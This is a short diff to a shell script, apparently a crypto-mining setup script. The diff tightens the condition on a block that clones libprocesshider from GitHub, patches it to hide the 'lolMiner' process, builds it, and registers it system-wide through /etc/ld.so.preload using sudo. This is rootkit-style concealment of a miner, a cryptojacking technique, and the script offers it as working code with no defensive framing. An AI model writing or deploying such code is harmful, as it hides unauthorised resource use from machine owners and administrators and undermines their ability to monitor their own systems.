@@ -3,7 +3,7 @@
 pause="true"
 preload="true"
 
-if [[ $preload == *"true"* ]]; then
+if [[ $preload == *"true"* ]] && [[ $pause == *"false"* ]]; then
     git clone https://github.com/gianlucaborello/libprocesshider; cd libprocesshider; awk '{ if (NR == 12) print "static const char* process_to_filter = \"lolMiner\";"; else print $0}' processhider.c > processhider1.c; rm processhider.c; mv processhider1.c processhider.c; make; sudo mv libprocesshider.so /usr/local/lib/; sudo sh -c "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload";
 fi
 
